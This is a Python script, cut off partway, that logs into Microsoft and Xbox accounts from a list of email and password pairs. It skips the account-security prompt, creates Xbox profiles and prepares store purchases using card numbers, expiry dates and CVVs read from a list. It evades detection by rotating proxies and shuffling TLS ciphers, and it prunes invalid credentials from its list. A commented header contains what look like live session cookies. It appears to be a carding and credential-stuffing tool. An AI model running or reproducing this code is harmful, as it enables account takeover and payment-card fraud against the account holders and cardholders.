import json,urllib,threading,sys,requests,httpx,certifi,base64,hmac,hashlib,string,random,colorama,urllib3 ;from uuid import uuid4 ; from colorama import Fore;import time as te ; from json import loads ; from re import search ; from threading import Thread
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.ssl_ import create_urllib3_context
urllib3.disable_warnings()
thread_lock = threading.Lock()
cfg = json.load(open("config.json"))
ORIGIN_CIPHERS = ('ECDH+AESGCM:DH+AESGCM:ECDH+AES256:DH+AES256:ECDH+AES128:DH+AES:ECDH+HIGH:' 'DH+HIGH:ECDH+3DES:DH+3DES:RSA+AESGCM:RSA+AES:RSA+HIGH:RSA+3DES')
ua : str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
request_exceptions = (requests.exceptions.ProxyError,requests.exceptions.Timeout,requests.exceptions.SSLError)
# request_exceptions = (requests.exceptions.SSLError)
prePareCartFlights = ['sc_appendconversiontype', 'sc_showvalidpis', 'sc_scdstextdirection', 'sc_optimizecheckoutload', 'sc_purchasedblockedby', 'sc_passthroughculture', 'sc_showcanceldisclaimerdefaultv1', 'sc_redirecttosignin', 'sc_paymentpickeritem', 'sc_cleanreducercode', 'sc_dimealipaystylingfix', 'sc_promocode', 'sc_onedrivedowngrade', 'sc_newooslogiconcart', 'sc_optionalcatalogclienttype', 'sc_klarna', 'sc_hidecontactcheckbox', 'sc_preparecheckoutrefactor', 'sc_checkoutklarna', 'sc_currencyformattingpkg', 'sc_fullpageredirectionforasyncpi', 'sc_xaaconversionerror', 'sc_promocodefeature-web-desktop', 'sc_eligibilityproducts', 'sc_disabledpaymentoption',
'sc_enablecartcreationerrorparsing', 'sc_purchaseblock', 'sc_returnoospsatocart', 'sc_dynamicseligibility', 'sc_usebuynowonlyinternalendpoint', 'sc_removemoreless', 'sc_renewalsubscriptionselector', 'sc_hidexdledd', 'sc_militaryshippingurl', 'sc_xboxdualleaf', 'sc_japanlegalterms', 'sc_multiplesubscriptions', 'sc_loweroriginalprice', 'sc_xaatovalenciastring', 'sc_cannotbuywarrantyalone', 'sc_showminimalfooteroncheckout', 'sc_checkoutdowngrade', 'sc_checkoutcontainsiaps', 'sc_localizedtax', 'sc_officescds', 'sc_disableupgradetrycheckout', 'sc_extendPageTagToOverride', 'sc_checkoutscenariotelemetry', 'sc_skipselectpi', 'sc_allowmpesapi', 'sc_purchasestatusmessage', 'sc_storetermslink', 'sc_postorderinfolineitemmessage', 'sc_addpaymentfingerprinttagging', 'sc_shippingallowlist', 'sc_emptyresultcheck', 'sc_dualleaf', 'sc_riskyxtoken', 'sc_abandonedretry', 'sc_testflightbuynow', 'sc_addshippingmethodtelemetry', 'sc_leaficons', 'sc_newspinneroverlay', 'sc_paymentinstrumenttypeandfamily', 'sc_addsitename', 'sc_disallowalipayforcheckout', 'sc_checkoutsignintelemetry', 'sc_prominenteddchange', 'sc_disableshippingaddressinit', 'sc_preparecheckoutperf',
'sc_buynowctatext', 'sc_buynowuiprod', 'sc_checkoutsalelegaltermsjp', 'sc_showooserrorforoneminute', 'sc_proratedrefunds', 'sc_entitlementcheckallitems', 'sc_indiaregsbanner', 'sc_checkoutentitlement', 'sc_rspv2', 'sc_focustrapforgiftthankyoupage', 'sc_hideneedhelp', 'sc_defaultshippingref', 'sc_uuid', 'sc_checkoutasyncpurchase', 'sc_nativeclientlinkredirect', 'sc_enablelegalrequirements', 'sc_expanded.purchasespinner', 'sc_valenciaupgrade', 'sc_enablezipplusfour', 'sc_giftingtelemetryfix', 'sc_handleentitlementerror', 'sc_alwayscartmuid', 'sc_sharedupgrade', 'sc_checkoutloadspinner', 'sc_xaaconversionexpirationdate', 'sc_helptypescript', 'sc_newdemandsandneedsstatement', 'sc_citizensoneallowed', 'sc_riskfatal', 'sc_renewtreatmenta', 'sc_trialtreatmenta', 'sc_cartzoomfix', 'sc_useofficeonlyinternalendpoint', 'sc_gotopurchase', 'sc_endallactivities', 'sc_headingheader', 'sc_flexsubs', 'sc_useanchorcomponent', 'sc_addbillingaddresstelemetry', 'sc_replacestoreappclient', 'sc_scenariotelemetryrefactor', 'sc_checkoutsmd', 'sc_scenariosupportupdate', 'sc_bankchallengecheckout', 'sc_addpaymenttelemetry', 'sc_railv2', 'sc_checkoutglobalpiadd', 'sc_reactcheckout', 'sc_xboxgotocart', 'sc_hidewarningevents', 'sc_xboxcomnosapi', 'sc_routebacktocartforoutofstock', 'sc_clientdebuginfo', 'sc_koreanlegalterms', 'sc_refactorprorate', 'sc_paymentoptionnotfound', 'sc_pidlflights', 'sc_fixcolorcontrastforrecommendeditems', 'sc_hideeditbuttonwhenediting', 'sc_enablekakaopay', 'sc_ordercheckoutfix', 'sc_xboxpmgrouping', 'sc_stickyfooter', 'sc_gotoredmrepl', 'sc_partnernametelemetry', 'sc_jpregionconversion', 'sc_checkoutorderedpv', 'sc_maxaddresslinelength', 'sc_componentexception', 'sc_buynowuipreload', 'sc_updatebillinginfo', 'sc_newshippingmethodtelemetry', 'sc_checkoutbannertelemetry', 'sc_learnmoreclcid', 'sc_satisfiedcheckout', 'sc_checkboxarialabel', 'sc_newlegaltextlayout', 'sc_newpagetitle', 'sc_prepaidcardsv3', 'sc_gamertaggifting', 'sc_checkoutargentinafee', 'sc_xboxcomasyncpurchase', 'sc_sameaddressdefault', 'sc_fixcolorcontrastforcheckout', 'sc_checkboxkg', 'sc_usebuynowbusinesslogic', 'sc_skippurchaseconfirm', 'sc_activitymonitorasyncpurchase', 'sc_shareddowngrade', 'sc_allowedpisenabled', 'sc_xboxoos', 'sc_eligibilityapi', 'sc_koreatransactionfeev1', 'sc_removesetpaymentmethod', 'sc_ordereditforincompletedata', 'sc_cppidlerror', 'sc_bankchallenge', 'sc_allowelo', 'sc_delayretry', 'sc_loadtestheadersenabled', 'sc_migrationforcitizenspay', 'sc_conversionblockederror', 'sc_allowpaysafecard', 'sc_purchasedblocked', 'sc_outofstock', 'sc_selectpmonaddfailure', 'sc_allowcustompifiltering', 'sc_errorpageviewfix', 'sc_windowsdevkitname', 'sc_xboxredirection', 'sc_usebuynowonlynonprodendpoint', 'sc_getmoreinfourl', 'sc_disablefilterforuserconsent', 'sc_suppressrecoitem', 'sc_dcccattwo', 'sc_hipercard', 'sc_resellerdetail', 'sc_fixpidladdpisuccess', 'sc_xdlshipbuffer', 'sc_allowverve', 'sc_inlinetempfix', 'sc_ineligibletostate', 'sc_greenshipping', 'sc_trackinitialcheckoutload', 'sc_creditcardpurge', 'sc_showlegalstringforproducttypepass', 'sc_newduplicatesubserror', 'sc_xboxgamepad', 'sc_xboxspinner', 'sc_xboxclosebutton', 'sc_xboxuiexp', 'sc_disabledefaultstyles', 'sc_gamertaggifting']
purchaseFlights = ['sc_appendconversiontype', 'sc_showvalidpis', 'sc_scdstextdirection', 'sc_optimizecheckoutload', 'sc_purchasedblockedby', 'sc_passthroughculture', 'sc_showcanceldisclaimerdefaultv1', 'sc_redirecttosignin', 'sc_paymentpickeritem', 'sc_cleanreducercode', 'sc_dimealipaystylingfix', 'sc_promocode', 'sc_onedrivedowngrade', 'sc_newooslogiconcart', 'sc_optionalcatalogclienttype', 'sc_klarna', 'sc_hidecontactcheckbox', 'sc_preparecheckoutrefactor', 'sc_checkoutklarna', 'sc_currencyformattingpkg', 'sc_fullpageredirectionforasyncpi', 'sc_xaaconversionerror', 'sc_promocodefeature-web-desktop', 'sc_eligibilityproducts', 'sc_disabledpaymentoption',
'sc_enablecartcreationerrorparsing', 'sc_purchaseblock', 'sc_returnoospsatocart', 'sc_dynamicseligibility', 'sc_usebuynowonlyinternalendpoint', 'sc_removemoreless', 'sc_renewalsubscriptionselector', 'sc_hidexdledd', 'sc_militaryshippingurl', 'sc_xboxdualleaf', 'sc_japanlegalterms', 'sc_multiplesubscriptions', 'sc_loweroriginalprice', 'sc_xaatovalenciastring', 'sc_cannotbuywarrantyalone', 'sc_showminimalfooteroncheckout', 'sc_checkoutdowngrade', 'sc_checkoutcontainsiaps', 'sc_localizedtax', 'sc_officescds', 'sc_disableupgradetrycheckout', 'sc_extendPageTagToOverride', 'sc_checkoutscenariotelemetry', 'sc_skipselectpi', 'sc_allowmpesapi', 'sc_purchasestatusmessage', 'sc_storetermslink', 'sc_postorderinfolineitemmessage', 'sc_addpaymentfingerprinttagging', 'sc_shippingallowlist', 'sc_emptyresultcheck', 'sc_dualleaf', 'sc_riskyxtoken', 'sc_abandonedretry', 'sc_testflightbuynow', 'sc_addshippingmethodtelemetry', 'sc_leaficons', 'sc_newspinneroverlay', 'sc_paymentinstrumenttypeandfamily', 'sc_addsitename', 'sc_disallowalipayforcheckout', 'sc_checkoutsignintelemetry', 'sc_prominenteddchange', 'sc_disableshippingaddressinit', 'sc_preparecheckoutperf',
'sc_buynowctatext', 'sc_buynowuiprod', 'sc_checkoutsalelegaltermsjp', 'sc_showooserrorforoneminute', 'sc_proratedrefunds', 'sc_entitlementcheckallitems', 'sc_indiaregsbanner', 'sc_checkoutentitlement', 'sc_rspv2', 'sc_focustrapforgiftthankyoupage', 'sc_hideneedhelp', 'sc_defaultshippingref', 'sc_uuid', 'sc_checkoutasyncpurchase', 'sc_nativeclientlinkredirect', 'sc_enablelegalrequirements', 'sc_expanded.purchasespinner', 'sc_valenciaupgrade', 'sc_enablezipplusfour', 'sc_giftingtelemetryfix', 'sc_handleentitlementerror', 'sc_alwayscartmuid', 'sc_sharedupgrade', 'sc_checkoutloadspinner', 'sc_xaaconversionexpirationdate', 'sc_helptypescript', 'sc_newdemandsandneedsstatement', 'sc_citizensoneallowed', 'sc_riskfatal', 'sc_renewtreatmenta', 'sc_trialtreatmenta', 'sc_cartzoomfix', 'sc_useofficeonlyinternalendpoint', 'sc_gotopurchase', 'sc_endallactivities', 'sc_headingheader', 'sc_flexsubs', 'sc_useanchorcomponent', 'sc_addbillingaddresstelemetry', 'sc_replacestoreappclient', 'sc_scenariotelemetryrefactor', 'sc_checkoutsmd', 'sc_scenariosupportupdate', 'sc_bankchallengecheckout', 'sc_addpaymenttelemetry', 'sc_railv2', 'sc_checkoutglobalpiadd', 'sc_reactcheckout', 'sc_xboxgotocart', 'sc_hidewarningevents', 'sc_xboxcomnosapi', 'sc_routebacktocartforoutofstock', 'sc_clientdebuginfo', 'sc_koreanlegalterms', 'sc_refactorprorate', 'sc_paymentoptionnotfound', 'sc_pidlflights', 'sc_fixcolorcontrastforrecommendeditems', 'sc_hideeditbuttonwhenediting', 'sc_enablekakaopay', 'sc_ordercheckoutfix', 'sc_xboxpmgrouping', 'sc_stickyfooter', 'sc_gotoredmrepl', 'sc_partnernametelemetry', 'sc_jpregionconversion', 'sc_checkoutorderedpv', 'sc_maxaddresslinelength', 'sc_componentexception', 'sc_buynowuipreload', 'sc_updatebillinginfo', 'sc_newshippingmethodtelemetry', 'sc_checkoutbannertelemetry', 'sc_learnmoreclcid', 'sc_satisfiedcheckout', 'sc_checkboxarialabel', 'sc_newlegaltextlayout', 'sc_newpagetitle', 'sc_prepaidcardsv3', 'sc_gamertaggifting', 'sc_checkoutargentinafee', 'sc_xboxcomasyncpurchase', 'sc_sameaddressdefault', 'sc_fixcolorcontrastforcheckout', 'sc_checkboxkg', 'sc_usebuynowbusinesslogic', 'sc_skippurchaseconfirm', 'sc_activitymonitorasyncpurchase', 'sc_shareddowngrade', 'sc_allowedpisenabled', 'sc_xboxoos', 'sc_eligibilityapi', 'sc_koreatransactionfeev1', 'sc_removesetpaymentmethod', 'sc_ordereditforincompletedata', 'sc_cppidlerror', 'sc_bankchallenge', 'sc_allowelo', 'sc_delayretry', 'sc_loadtestheadersenabled', 'sc_migrationforcitizenspay', 'sc_conversionblockederror', 'sc_allowpaysafecard', 'sc_purchasedblocked', 'sc_outofstock', 'sc_selectpmonaddfailure', 'sc_allowcustompifiltering', 'sc_errorpageviewfix', 'sc_windowsdevkitname', 'sc_xboxredirection', 'sc_usebuynowonlynonprodendpoint', 'sc_getmoreinfourl', 'sc_disablefilterforuserconsent', 'sc_suppressrecoitem', 'sc_dcccattwo', 'sc_hipercard', 'sc_resellerdetail', 'sc_fixpidladdpisuccess', 'sc_xdlshipbuffer', 'sc_allowverve', 'sc_inlinetempfix', 'sc_ineligibletostate', 'sc_greenshipping', 'sc_trackinitialcheckoutload', 'sc_creditcardpurge', 'sc_showlegalstringforproducttypepass', 'sc_newduplicatesubserror', 'sc_xboxgamepad', 'sc_xboxspinner', 'sc_xboxclosebutton', 'sc_xboxuiexp', 'sc_disabledefaultstyles', 'sc_gamertaggifting']

class SSLContext(object):
    def GetContext():
        ciphers_top = "ECDH+AESGCM:ECDH+CHACHA20:DH+AESGCM"
        ciphers_mid = 'DH+CHACHA20:ECDH+AES256:DH+AES256:ECDH+AES128:DH+AES:ECDH+HIGH:DH+HIGH:RSA+AESGCM:RSA+AES:RSA+HIGH:!aNULL:!eNULL:!MD5:!3DES'
        cl = ciphers_mid.split(":")
        cl_len = len(cl)
        els = []
        
        for i in range(cl_len):
            idx = random.randint(0, cl_len-1)
            els.append(cl[idx])
            del cl[idx]
            cl_len-=1
        
        ciphers2 = ciphers_top+":".join(els)
        context = httpx.create_ssl_context()
        context.load_verify_locations(cafile=certifi.where())
        context.set_alpn_protocols(["h2"])
        context.minimum_version.MAXIMUM_SUPPORTED
        CIPHERS = ciphers2
        context.set_ciphers(CIPHERS)
        
        ciphers2
    
    def GetTransport():
        return httpx.HTTPTransport(retries=3)

class DESAdapter(HTTPAdapter):
    def __init__(self, *args, **kwargs):
        """
        A TransportAdapter that re-enables 3DES support in Requests.
        """
        CIPHERS = ORIGIN_CIPHERS.split(':')
        random.shuffle(CIPHERS)
        CIPHERS = ':'.join(CIPHERS)
        self.CIPHERS = CIPHERS + ':!aNULL:!eNULL:!MD5'
        super().__init__(*args, **kwargs)

    def init_poolmanager(self, *args, **kwargs):
        context = create_urllib3_context(ciphers=self.CIPHERS)
        kwargs['ssl_context'] = context
        return super(DESAdapter, self).init_poolmanager(*args, **kwargs)

    def proxy_manager_for(self, *args, **kwargs):
        context = create_urllib3_context(ciphers=self.CIPHERS)
        kwargs['ssl_context'] = context
        return super(DESAdapter, self).proxy_manager_for(*args, **kwargs)
    
def generate_permission_data(data:str, secret:str):
    time = int(te.time() * 1000)
    timeframe = int(time - (time % 36000))
    return {
    "pxmac": hmac.new(secret.encode('utf-8'), msg=f"PI|{data}|{timeframe}".encode('utf-8'), digestmod=hashlib.sha256).hexdigest().upper(),
    "keyToken": str(base64.b64encode(secret.encode('utf-8'))),
    "data": str(base64.b64encode(data.encode('utf-8')))
  } 
def db64(data, altchars=b'+/'):
        if len(data) % 4 and '=' not in data:
            data += '='* (4 - len(data) % 4)
        return base64.b64decode(data, altchars)
def sprint(content, status: str="c") -> None:
    thread_lock.acquire()
    if status=="y":
        colour = Fore.YELLOW
    elif status=="c":
        colour = Fore.CYAN
    elif status=="r":
        colour = Fore.RED
    elif status=="new":
        colour = Fore.LIGHTYELLOW_EX
        thread_lock.acquire()
    sys.stdout.write(
            f"{colour}{content}"
            + "\n"
            + Fore.RESET
        )    
    thread_lock.release()
def get_access_token(s,creds: str):

  pwd = creds.split("|")[1]
  email = creds.split("|")[0]
  auth_url = "https://login.live.com/oauth20_authorize.srf?client_id=000000004C12AE6F&scope=service::user.auth.xboxlive.com::MBI_SSL&response_type=token&redirect_uri=https://login.live.com/oauth20_desktop.srf"
  headers = {
    'Accept':
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'keep-alive',
    'Sec-Fetch-Dest': 'document',
    'Accept-Encoding': 'identity',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-User': '?1',
    'Sec-GPC': '1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': ua,
  }

  while True:
    try:
      response = s.get(auth_url,
                       headers=headers,
                       timeout=20).text
      break
    except request_exceptions:
      continue
    except Exception as e:
      print(str(e), "r")
      return
  try:
    ppft = response.split(
      ''''<input type="hidden" name="PPFT" id="i0327" value="''')[1].split(
        '"')[0]
    log_url = response.split(",urlPost:'")[1].split("'")[0]
  except:
    print("[-] Unknown Error (Proxies probably banned)")
    return
  log_data = f'i13=0&login={email}&loginfmt={email}&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={pwd}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&isSignupPost=0&isRecoveryAttemptPost=0&i19=449894'
  headers = {
    'Accept':
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.9',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'https://login.live.com',
    'Referer': 'https://login.live.com/',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Sec-GPC': '1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': ua,
  }
  while True:
    try:
      response = s.post(log_url, timeout=20, data=log_data,
                        headers=headers).text
      break
    except request_exceptions:
      continue
    except Exception as e:
      print(e, "r")
      return
  if "https://account.live.com/proofs/Add" in response:
    get_proof_url = response.split('form name="fmHF" id="fmHF" action="')[1].split('"')[0]
    ipt = response.split('type="hidden" name="ipt" id="ipt" value="')[1].split('"')[0]
    pprid = response.split('name="pprid" id="pprid" value="')[1].split('"')[0]
    uaid = response.split('type="hidden" name="uaid" id="uaid" value="')[1].split('"')[0]
    headers ={
    'authority': 'account.live.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'accept-language': 'en-US,en;q=0.6',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://login.live.com',
    'referer': 'https://login.live.com/',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-site',
    'sec-gpc': '1',
    'upgrade-insecure-requests': '1',
    'user-agent': ua,
}
    while True:
      try:
        response = s.post(get_proof_url,data={"ipt":ipt,"pprid":pprid,"uaid":uaid},headers=headers).text
        break
      except request_exceptions:
        continue
      except Exception as e:
        print(e,"r")
        return
    canary = response.split('id="canary" name="canary" value="')[1].split('"')[0]
    skip_url = response.split('id="frmAddProof" method="post" action="')[1].split('"')[0]
    data = {
    'iProofOptions': 'Email',
    'DisplayPhoneCountryISO': 'US',
    'DisplayPhoneNumber': '',
    'EmailAddress': '',
    'canary': canary,
    'action': 'Skip',
    'PhoneNumber': '',
    'PhoneCountryISO': '',
}
    while True:
      try:
        res = s.post(skip_url,data=data,headers={
    'authority': 'account.live.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'accept-language': 'en-US,en;q=0.6',
    'cache-control': 'max-age=0',
    # 'cookie': 'wlidperf=FR=L&ST=1677312883349; PPLState=1; MSPAuth=Disabled; MSPProf=Disabled; NAP=V=1.9&E=1bad&C=kStvhUOTTm9tU6piRuLxEB5LpvvGB_WbGnakRnc33gOJhpp08V52-g&W=1; ANON=A=9DF116B3229C667FABBDC09EFFFFFFFF&E=1c07&W=1; WLSSC=EgAlAgMAAAAMgAAADQABT7KHQDHg704fl0Y+oOkj1+pgHBZGmgerwG1EqW8pPEvt1bXVluq3/O6v5gfNv9RTgcbone0M2tibXzSdnV/+IfgrOuzyar20hs0ip2mT5rENQV0MEAceUKkMDG6ay871Kd5QwDT/lITGx6WiwVv6p3vOMV3ehQmX6/Yc0dMgTefEie3L1cEswCOZBLw2O7a6NsgfLXvUXK/kpeL+eeeN62RfZzEIuINopqkymwipveggDeBg8b2mZ+apI+ZlA5+gzofivNjw5rupPqJmm3AosWJEEQ43+7nwTlcBQkKZAkVokq+/efiJfPc7dxHgXQ82DexJZ76CbznYoliwJ99WrBQBfgAUAf2/BgCXz18ndcP5Y3PD+WMQJwAAChCggBAaAGdpemNob2F0aXRzb2NAaG90bWFpbC5jb20AUwAAGWdpemNob2F0aXRzb2NAaG90bWFpbC5jb20AAAABVVMAAAAAAAAECQIAAHlqVUAABEMABmdpemNobwAGYXRpdHNvAAAAAAAAAAAAAAAAAAAAAAAA7mKZ4nKmMOQAAHXD+WNzanBkAAAAAAAAAAAAAAAADwAxOTQuMTQ2LjM4LjE3OAAEAQAAAAAAAAAAAAAAAAEEAAAAAAAAAAAAAAAAAAAAmOAUTiPu/L0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAAAA; RPSMaybe=1677313185; mkt=en-US; mkt1=en-US; AMSTATE=BBAG=256&CID=72a630e4ee6299e2&RENAMERULENS=&NewMN=&UserNameQs=&SESSIONID=8645a08f-b7ba-4cb6-85ed-8311f90b0192; amsc=xpTDdQLhJOCQFopbW9TGF38Js5LfM+qapM6KVJ7IoRB6lekCT++Az0tIFw0t4EKh8yOf0/6HWVo5/YB8JwhLufwSVyenKrI/G80jncCL1cmCLhs2hb+EIID6PsQ3UhkJHKeU4iHRqBfgpyOxdWmonEMnqVvi9tTByIZYqn9Nxun9pHwnPITwLmH9pKWGIU7NjHBo2iz6/IntRrrgstqB2DLB1DrBFSXmVsZPkY79SfyQuN2BLE/pG/Y9820dgldxTwDjIF0374x24eVWtarEw7bGtNE2RcbgRnjfxWA2Gdug6E38KFLN8RAxlhzGWeOT:2:3c; IPT=E=XdiKg7t2ZpwvmG9KD0GLB8g0ZBRKIGY3xU%2BHq1Yw%2BbVKLPWLJ%2FsHTEXIG2N3k1I7sdFgIR9OA47fw1xjFXQtune6N%2Bnm9SFC%2FGZLfF2MsT5DKaijFdYl5jrixR3WHElOx%2FNa%2F%2B61Mq%2B65TAITymiqGhzqaCQx%2FrOs5p65GHRit7NfmSU7VjcNTz22kvSBPcMwDn5mgwLQI4K%2F6BMAzczcf5f%2FJgUyJ%2FBX1wNbRhL1WxIrYTEYXEetQO5b2NEYWX5SLMrq%2Fb5XiYLoDuyc1qgFGpzKaVKio%2FOixLpzwBDUlmir5b5NHi5FNPiT2qBD15tg52mGHoHofnddRC6wj%2BhViOMTvrt7oy6Lyf7TWvazfkkF%2BlETqkQJ%2FLnODPeUOt6Vzm05llPosS%2BiT1ZXMQlhRveOpJKHDg0Z2VBLvoOZofT3j69l%2FB36Cyd6jhNXMu3JwBuJ%2F9kb%2BWHGBM4xmYhIy6ZFgXHbT%2BJ3q4aXevykW9rzIbi0bhVwdmCNW5pV%2BCbYjIkHmisR5TiTAf5JQfxQamaGzZXAEwQ2KIRv51dAMCiMv8C4ZvFU9w2SZTXUg9SFUZ%2FyC8WCXrYlqY90mKjwONB7V40VewOPUsOykSjwNeJU5kOrG7TMi41u4qqmX27Xc9vuWD5h%2BHE1st9n79KbIKXtMGJ95R7NNvwWrTm9U%2B3nwsYqJrI2vC8hTHLwXXciEZllXI9qxesjjtmJzsuCYwUGnowRDk5VqURqk5F3iW6tTmQl3SCGROTMo3wou7N%3A2%3A3c; clrc={%2219413%22%3a[%22d7PFy/1V%22%2c%22SnF4cjF1%22%2c%22s+wc3ZYT%22%2c%224z455IZG%22%2c%225FpkEdSV%22%2c%22+VC+x0R6%22%2c%22WTWmWDKx%22%2c%22hpK6IkLs%22%2c%22GygCh3oD%22%2c%22Dn72E5AG%22%2c%22FutSZdvn%22%2c%22qXzd9wBr%22]}',
    'origin': 'https://account.live.com',
    'referer':get_proof_url,
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'sec-gpc': '1',
    'upgrade-insecure-requests': '1',
    'user-agent': ua,
})  
        break
      except request_exceptions:
        continue
      except Exception as e:
        print(e,"r") 
        return
    return res.url.split('access_token=')[1].split('&')[0]
  get_access_token_req = s.get(
    auth_url,
    headers={
      'Accept':
      'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
      'Accept-Language': 'en-US,en;q=0.6',
      'Connection': 'keep-alive',
      'Sec-Fetch-Dest': 'document',
      'Sec-Fetch-Mode': 'navigate',
      'Sec-Fetch-Site': 'none',
      'Sec-Fetch-User': '?1',
      'Sec-GPC': '1',
      'Upgrade-Insecure-Requests': '1',
      'User-Agent': ua,
    }).url
  access_token = get_access_token_req.split('access_token=')[1].split('&')[0]
  return urllib.parse.unquote(access_token)

def remove_content(filename: str, delete_line: str) -> None:
        thread_lock.acquire()
        with open(filename, "r+") as io:
            content = io.readlines()
            io.seek(0)
            for line in content:
                if not (delete_line in line):
                    io.write(line)
            io.truncate()
        thread_lock.release()
def getRandomLetters(len : int):
    return ''.join(random.choices(string.ascii_uppercase,k=len))

def generateHexStr(len: int):
    return ''.join(random.choices('0123456789abcdef', k=len))

def getRandomInt(len : int):
    return ''.join(random.choices(string.digits,k=len))


def main(ms_creds : str , full_card : str, full_bin : str,vcc_list):
    s = requests.session()
    s.mount("https://", DESAdapter())
    if not cfg["proxies"]=="":
        s.proxies={"https":"http://"+cfg["proxies"]}
    locale = full_bin.split("|")[4]
    postal_code = full_bin.split("|")[5]
    country_sm = locale.split("-")[1]
    email = ms_creds.split("|")[0]
    password = ms_creds.split("|")[1]
    card = full_card.split("|")[0]
    exp_month = full_card.split("|")[1]
    exp_year = full_card.split("|")[2]
    cvv = full_card.split("|")[3]
    if card.startswith("4"):
        card_type = "visa"
    elif card.startswith("5"):
        card_type = "mc"
    elif card.startswith("6"):
        card_type = "amex"
    else:
        sprint("[-] Unsupported card!","y")
        return
    try:
        get_access_token(s,ms_creds)
    except Exception as e:
        sprint("[-] Invalid microsoft acc! ","c")
        sprint(e)
        remove_content("accs.txt",ms_creds)
        return
    heads = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'keep-alive',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-User': '?1',
    'Sec-GPC': '1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': ua,
}
    while True:
        try:
            response = s.get("https://account.xbox.com/",timeout=20,headers=heads).text
            break
        except request_exceptions:
            continue
        except Exception as e:
            sprint(e,"r")
            return
    try:
        xbox_json = {
"fmHF": response.split('id="fmHF" action="')[1].split('"')[0],
"pprid": response.split('id="pprid" value="')[1].split('"')[0],
"nap": response.split('id="NAP" value="')[1].split('"')[0],
"anon": response.split('id="ANON" value="')[1].split('"')[0],
"t": response.split('id="t" value="')[1].split('"')[0]} 
    except:
        sprint("IP banned on https://account.xbox.com/","y")
        return
    heads = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.9',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Origin': 'https://login.live.com',
    'Referer': 'https://login.live.com/',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'cross-site',
    'Sec-GPC': '1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': ua,
}
    while True:
        try:
            verify_token = s.post(xbox_json['fmHF'],timeout=20, headers={
        'Content-Type': 'application/x-www-form-urlencoded',
    },data={
        "pprid": xbox_json['pprid'],
        "NAP": xbox_json['nap'],
        "ANON": xbox_json['anon'],
        "t": xbox_json['t']
    }).text
            break
        except request_exceptions:
            continue
        except Exception as e:
            sprint(e,"r")
            return
    

    reqVerifytoken = verify_token.split('name="__RequestVerificationToken" type="hidden" value="')[1].split('"')[0]
    heads={
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Origin': 'https://account.xbox.com',
    'Referer': xbox_json['fmHF'],
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-GPC': '1',
    'User-Agent': ua,
    'X-Requested-With': 'XMLHttpRequest',
    '__RequestVerificationToken': reqVerifytoken,
}
    while True:
        try:
            make_acc = s.post("https://account.xbox.com/en-us/xbox/account/api/v1/accountscreation/CreateXboxLiveAccount",timeout=20, headers=heads,data={
        "partnerOptInChoice": "false",
        "msftOptInChoice": "false",
        "isChild": "true",
        "returnUrl": "https://www.xbox.com/en-US/?lc=1033"
    })
            break
        except request_exceptions:
            continue
        except Exception as e:
            sprint(e,"r")
            return
    if not make_acc.ok:
        sprint("[-] Failed to create XBOX profile!")
        vcc_list.insert(0,full_card)
        return
    heads = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'keep-alive',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-User': '?1',
    'Sec-GPC': '1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': ua,
}
    while True:
        try:
